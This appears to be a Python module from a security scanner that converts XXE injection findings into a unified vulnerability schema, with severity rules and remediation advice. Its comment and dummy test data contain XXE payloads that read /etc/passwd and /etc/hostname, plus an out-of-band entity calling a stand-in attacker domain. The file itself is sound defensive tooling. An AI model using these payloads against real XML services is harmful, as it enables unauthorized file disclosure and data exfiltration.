import json
import uuid
from datetime import datetime, timezone

def parse_xxe_vulnerabilities(json_file_path, scan_id):
    """
    Parses XML External Entity (XXE) Injection vulnerability data from a JSON file
    and transforms it into the unified vulnerability schema.

    Args:
        json_file_path (str): Path to the XXE module's JSON output file.
        scan_id (str): The ID of the scan job.

    Returns:
        list: A list of vulnerability objects adhering to the unified schema.
    """
    unified_vulnerabilities = []
    try:
        with open(json_file_path, 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        return unified_vulnerabilities
    except json.JSONDecodeError:
        return unified_vulnerabilities

    # Expected placeholder XXE module output:
    # {
    #   "notes": "Conceptual XXE scan for example.com",
    #   "vulnerabilities": [
    #     {
    #       "url": "http://api.example.com/xml_processor",
    #       "type": "XXE - File Disclosure",
    #       "tool": "XXE Hunter (Conceptual)",
    #       "evidence": "Successfully retrieved content of /etc/passwd via XXE payload.",
    #       "payload_used": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">...&xxe;"
    #     }
    #   ]
    # }

    raw_vulnerabilities = data.get("vulnerabilities", [])
    if not raw_vulnerabilities:
        return unified_vulnerabilities

    for vuln in raw_vulnerabilities:
        vuln_type_detail = vuln.get("type", "Generic XXE")

        severity = "High" # XXE is generally High or Critical
        confidence = "Medium"

        if "File Disclosure" in vuln_type_detail:
            severity = "Critical"
            confidence = "High" # If file content is confirmed
        elif "Blind XXE (OOB)" in vuln_type_detail: # Out-of-Band
            severity = "Critical"
            confidence = "High" # OOB interaction is strong evidence
        elif "Error-based" in vuln_type_detail:
            severity = "Medium"
            confidence = "Medium"

        description = vuln.get("description", f"Potential XML External Entity (XXE) Injection: {vuln_type_detail} identified by {vuln.get('tool', 'XXE Hunter')}.")
        if vuln.get("payload_used"):
            description += f" Payload used: {vuln.get('payload_used')}."
        if vuln.get("evidence"):
            description += f" Evidence: {vuln.get('evidence')}"

        now_utc = datetime.now(timezone.utc).isoformat()

        unified_vuln = {
            "id": str(uuid.uuid4()),
            "vulnerability_type": f"XML External Entity (XXE) Injection - {vuln_type_detail}",
            "description": description,
            "target_url": vuln.get("url", "N/A"),
            "affected_component": vuln.get("injection_point", "XML Body/Parameter"), # e.g., "Request Body", "SOAPAction Header"
            "payload": vuln.get("payload_used", None),
            "evidence": vuln.get("evidence", f"Finding reported by {vuln.get('tool', 'XXE Hunter')}."),
            "severity": severity,
            "confidence": confidence,
            "source_modules": [vuln.get("tool", "XXE Hunter")],
            "first_seen_timestamp": now_utc,
            "last_seen_timestamp": now_utc,
            "status": "New",
            "cwe_ids": [611], # CWE for XXE
            "cvss_vector": None,
            "cvss_score": None,
            "remediation_advice": "Disable DTDs (Document Type Definitions) and external entities in XML parsers. Use secure XML parsing libraries with XXE protection enabled by default. Sanitize any XML input.",
            "tags": ["XXE", vuln_type_detail.replace(" ", "_"), vuln.get("tool", "XXE Hunter").replace(" ", "_")],
            "scan_id": scan_id
        }
        unified_vulnerabilities.append(unified_vuln)

    return unified_vulnerabilities

if __name__ == '__main__':
    dummy_data = {
        "notes": "Conceptual XXE scan completed for example.com.",
        "vulnerabilities": [
            {
                "url": "http://api.example.com/submit_order",
                "type": "XXE - File Disclosure (/etc/hostname)",
                "tool": "XXE Hunter (Conceptual)",
                "evidence": "Retrieved server hostname 'prod-server-01' via XXE.",
                "payload_used": "<!ENTITY xxe SYSTEM \"file:///etc/hostname\"> <order><product>&xxe;</product></order>",
                "injection_point": "XML Request Body"
            },
            {
                "url": "http://legacy.example.com/soap_service",
                "type": "Blind XXE (OOB DNS Interaction)",
                "tool": "XXE Hunter (Conceptual)",
                "evidence": "DNS callback received for entity loaded via XXE.",
                "payload_used": "<!ENTITY % xxe SYSTEM \"http://random_subdomain.attacker_controlled.com\"> %xxe;",
                "injection_point": "SOAP Request"
            }
        ]
    }
    dummy_file = "dummy_xxe_vulnerabilities.json"
    with open(dummy_file, 'w') as f:
        json.dump(dummy_data, f, indent=2)

    parsed_vulns = parse_xxe_vulnerabilities(dummy_file, "test_scan_xxe_001")
    if parsed_vulns:
        print(f"Successfully parsed {len(parsed_vulns)} XXE vulnerabilities:")
        for v in parsed_vulns:
            print(json.dumps(v, indent=2))
    else:
        print("No XXE vulnerabilities parsed or file not found.")

    import os
    os.remove(dummy_file)
